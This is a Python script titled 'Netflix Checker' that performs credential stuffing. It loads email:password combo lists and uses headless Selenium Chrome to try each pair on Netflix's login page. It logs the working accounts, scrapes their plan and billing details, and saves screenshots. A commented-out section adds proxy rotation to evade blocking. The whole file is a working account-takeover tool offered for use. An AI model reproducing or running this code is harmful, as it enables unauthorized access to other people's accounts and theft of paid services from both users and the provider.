'''
by SALAH-ELHINT "https://github.com/SALAH-ELHINT"
'''
import pip

install=[
    'selenium',
    'webdriver-manager',
    'os',
    'time'
]

def import_or_install(package):
    try:
        __import__(package)
    except ImportError:
        pip.main(['install', package])

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service as ChromeService
    from webdriver_manager.chrome import ChromeDriverManager
    from selenium.common.exceptions import NoSuchElementException
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.common.by import By
    import os
    import time
except:
    for i in range(len(install)):
        import_or_install(install[i])

options = webdriver.ChromeOptions()
options.headless = True #hide Chrome Driver
driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()),options=options)
driver.get('https://www.netflix.com/login')
print()
print('''\033[1;31;40m                                                                           
                              _   _        _     __  _  _           ____  _                  _                
                             | \ | |  ___ | |_  / _|| |(_)__  __   / ___|| |__    ___   ___ | | __  ___  _ __ 
                             |  \| | / _ \| __|| |_ | || |\ \/ /  | |    | '_ \  / _ \ / __|| |/ / / _ \| '__|
                             | |\  ||  __/| |_ |  _|| || | >  <   | |___ | | | ||  __/| (__ |   < |  __/| |   
                             |_| \_| \___| \__||_|  |_||_|/_/\_\   \____||_| |_| \___| \___||_|\_\ \___||_|   
                                                                                                           
             © Netflix Checker by SALAH-ELHINT                                                      
\033''')
print()
while True:
    print('''\033[1;34;40m''',end='')
    combo_name=input('Entry Combo: \033[1;33;40m')
    print('''\033[1;34;40m''',end='')
    #combo_name=input('Entry Proxy: \033[1;33;40m')
    #print('''\033[1;34;40m''',end='')
    if os.path.exists(f'{combo_name}.txt') :# and os.path.exists(f'{proxy_name}.txt') 
        break
print()
file_combo = open(f'{combo_name}.txt', 'r+')
#file_proxy = open(f'{proxy_name}.txt', 'r+')
file_combo_failed = open('combo_failed.txt', 'a+')
file_combo_successful = open('combo_successful.txt', 'a+')
n,bad_acc,good_acc=-1,0,0
def line_num(name_file,line_count = 0):
    for line in name_file:
        if ':' in line:
            if line != '\n':
                line_count = line_count+1
    return line_count
print(f'''\033[1;32;40m _________ Settings _______________________________________________\n\
|\n| \033[1;34;40m[INFO]\033[0;0m\033[1;32;40m [>>] {combo_name}.txt Loaded : \033[1;33;40m{line_num(file_combo)}\033[0;0m\033[1;32;40m
|\n\
|\n| \033[1;34;40m[INFO]\033[0;0m\033[1;32;40m [>>] proxy.txt Loaded : \033[1;33;40m0\033[0;0m\033[1;32;40m
|\n\
|\n\
|_________________________________________________________________\033\n''')
time.sleep(3)
file_combo = open(f'{combo_name}.txt', 'r+')
#file_proxy = open(f'{proxy_name}.txt', 'r+')
try:
    for line_combo in file_combo:
        file_combo = open(f'{combo_name}.txt', 'r+')
        n = n + 1
        if ':' in line_combo:
            print()
            print(f'\033[1;33;40m Checker is running - \033[1;32;40m[+] Good Accounts  : [{good_acc}] \033[1;33;40m~~~ \033[1;31;40m[-] Bad Accounts  :  [{bad_acc}] ',end='\r')
            d = line_combo.split(":")
            mail, passw = d[0], d[1]
            try:
                time.sleep(0.1)
                driver.find_element(By.NAME,'password').send_keys(passw)
                driver.find_element(By.NAME,'userLoginId').send_keys(mail)
                driver.find_element(By.CLASS_NAME,'btn ').click()
                time.sleep(0.6)
                driver.find_element(By.ID,'id_userLoginId').clear()
                try:
                    try:
                        Incorrect_password = driver.find_element(By.XPATH,'//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/div/div[2]/b')
                        if Incorrect_password.is_displayed():
                            print()
                            print(f'\033[1;31;40m[!] Login failed ## (Incorrect_password) => \033[1;37;40m{mail}:{passw}')
                            file_combo = open(f'{combo_name}.txt', "r+")
                            line_combo = file_combo.readlines()
                            line_combo_Incorrect_password = (f'mail=>{mail}\nIncorrect_password | pass=>{passw}####################\n')
                            file_combo_failed = open('combo_failed.txt', 'a+')
                            file_combo_failed.write(line_combo_Incorrect_password)
                            file_combo_failed.close()
                            line_combo[n] = (f'[!] Login failed ## (Incorrect_password) => {mail}={passw}')
                            file_combo = open(f'{combo_name}.txt', "w+")
                            file_combo.writelines(line_combo)
                            file_combo.close()
                    except NoSuchElementException:
                        Incorrect_email = driver.find_element(By.XPATH,'//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/div/div[2]/a')
                        if Incorrect_email.is_displayed():
                            print()
                            print(f'\033[1;31;40m[!] Login failed ## (Incorrect_email) => \033[1;37;40m{mail}:{passw}')
                            print()
                            file_combo = open(f'{combo_name}.txt', "r+")
                            line_combo = file_combo.readlines()
                            line_combo_Incorrect_email = (f'Incorrect_email | mail=>{mail}\npass=>{passw}####################\n')
                            file_combo_failed = open('combo_failed.txt', 'a+')
                            file_combo_failed.write(line_combo_Incorrect_email)
                            file_combo_failed.close()
                            line_combo[n] = (f'[!] Login failed ## (Incorrect_email) => {mail}={passw}')
                            file_combo = open(f'{combo_name}.txt', "w+")
                            file_combo.writelines(line_combo)
                            file_combo.close()
                    bad_acc=bad_acc+1
                except NoSuchElementException:
                    print()
                    print(f'\033[1;33;40m[!]  ####  technical difficulties  ####  \033')
                    driver.close()
                    driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()), options=options)
                    driver.get('https://www.netflix.com/login')
            except NoSuchElementException:
                try:
                    acc_premium = driver.find_element(By.XPATH,'//*[@id="appMountPoint"]/div/div/div[1]/div[1]/div[2]/div/span/a')
                    if acc_premium.is_displayed():
                        print()
                        print(f'\033[1;32;40m[+] Login successful ## (acc premium) => \033[1;37;40m{mail}:{passw}')
                        driver.find_element(By.TAG_NAME,'body').send_keys(Keys.COMMAND + 't')
                        driver.get('https://www.netflix.com/BillingActivity')
                        d1 = mail.split('@')
                        time.sleep(0.5)
                        date_end=driver.find_element(By.XPATH,'//*[@id="appMountPoint"]/div/div/div[2]/div/div/section/div/div[2]')
                        date_end=date_end.text
                        driver.get('https://www.netflix.com/YourAccount')
                        driver.get_screenshot_as_file(f'{d1[0]}.png')
                        time.sleep(2)
                        plan=driver.find_element(By.XPATH,'/html/body/div[1]/div/div/div[2]/div/div/div[4]/div[2]/section/div/div[1]/div[1]/div/b')
                        plan=plan.text
                        date_start = driver.find_element(By.XPATH,'/html/body/div[1]/div/div/div[2]/div/div/div[1]')
                        date_start = date_start.text
                        file_combo = open(f'{combo_name}.txt', "r+")
                        line_combo = file_combo.readlines()
                        line_combo_successful = (f'plan details=> {plan} | {date_start} | Next billing date : {date_end} | {mail}:{passw}')
                        file_combo_successful = open('combo_successful.txt', 'a+')
                        file_combo_successful.write(line_combo_successful)
                        file_combo_successful.close()
                        line_combo[n] = (f'[+] Login successful ## (acc premium) => {mail}={passw}')
                        file_combo = open(f'{combo_name}.txt', "w+")
                        file_combo.writelines(line_combo)
                        file_combo.close()
                        good_acc = good_acc + 1
                        driver.close()
                        driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()),options=options)
                        driver.get('https://www.netflix.com/login')
                except NoSuchElementException:
                    try:
                        acc_free = driver.find_element(By.XPATH,'//*[@id="formstart"]/button/span[1]')
                    except NoSuchElementException:
                        driver.get('https://www.netflix.com')
                        acc_free = driver.find_element(By.XPATH,'//*[@id="formstart"]/button/span[1]')
                    if acc_free.is_displayed():
                        print()
                        print(f'\033[1;32;40m[+] Login successful ## (acc free) => \033[1;37;40m{mail}:{passw}')
                        driver.close()
                        driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()),options=options)
                        driver.get('https://www.netflix.com/login')
                        file_combo = open(f'{combo_name}.txt', "r+")
                        line_combo = file_combo.readlines()
                        line_combo_successful = (f'plan details=> Free | {mail}:{passw}\n')
                        file_combo_successful.write(line_combo_successful)
                        line_combo[n] = (f'[+] Login successful ## (acc free) => {mail}={passw}')
                        file_combo = open(f'{combo_name}.txt', "w+")
                        file_combo.writelines(line_combo)
                        file_combo.close()
                        good_acc = good_acc + 1
except NoSuchElementException:
    print()
    print('\033[1;33;40m\n                  #############################                  HTTP ERROR 403                  #############################\n\033[1;31;40m')  
finally:
    print()
    try:
        driver.close()
    except :
        pass
    print(f'\n\033[1;33;40m Checker result - \033[1;32;40m[+] Good Accounts  : [{good_acc}] \033[1;33;40m~~~ \033[1;31;40m[-] Bad Accounts  :  [{bad_acc}] ')

#proxy code
'''
chrome_options = webdriver.ChromeOptions()
PROXY = '144.202.113.90:8080'
chrome_options.add_argument('--proxy-server=%s' % PROXY)
driver = webdriver.Chrome('C:\Program Files\Google\Chrome\Application\96.0.4664.110\chromedriver.exe',chrome_options=chrome_options)
driver.get('https://www.netflix.com/login')

file=open('proxy.txt','r')
for proxy in file:
    chrome_options = webdriver.ChromeOptions()
    proxy=proxy.rstrip()
    chrome_options.add_argument('--proxy-server=%s' % proxy)
    driver = webdriver.Chrome(r'\chromedriver.exe',chrome_options=chrome_options)
    driver.get('https://whatismyipaddress.com/fr/mon-ip')
    print(proxy)
    driver.close()

chrome_options = webdriver.ChromeOptions()
proxy=random.choice(list(open('proxy.txt')
chrome_options.add_argument('--proxy-server=%s' % proxy)
driver = webdriver.Chrome(r'\chromedriver.exe',chrome_options=chrome_options)
driver.get('https://whatismyipaddress.com/fr/mon-ip')
print(proxy)
driver.close()
'''


'''
by SALAH-ELHINT "https://github.com/SALAH-ELHINT"
'''